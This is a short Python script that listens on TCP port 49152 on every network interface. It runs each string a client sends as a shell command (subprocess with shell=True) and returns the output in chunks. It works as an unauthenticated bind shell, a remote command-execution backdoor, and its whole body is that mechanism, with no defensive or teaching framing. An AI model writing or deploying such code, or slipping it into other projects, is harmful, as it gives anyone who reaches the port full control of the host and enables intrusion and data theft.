import socket
import subprocess

def receive_data():
    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    local_ip = "0.0.0.0"
    local_tcp_port = 49152
    # Bind socket to local port
    tcp_socket.bind((local_ip, local_tcp_port))
    tcp_socket.listen(10)
    while True:
        client_socket, client_address = tcp_socket.accept()
        # Accept client connection
        try:
            # Receive the command from the client
            command = client_socket.recv(1024).decode()

            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)

            print(result)
            result = result.decode() + "EOD"
            result = result.encode()

            chunk_size = 1024
            bytes_sent = 0
            for i in range(0, len(result), chunk_size):
                chunk = result[i:i + chunk_size]
                bytes_sent += client_socket.send(chunk)
                print("Bytes sent:", bytes_sent)
            print("Size of data:", len(chunk))
            print("Size of sent bytes:", bytes_sent)
        except Exception as e:
            print(f"Error: {str(e)}")
        finally:
            client_socket.close()

if __name__ == "__main__":
    receive_data()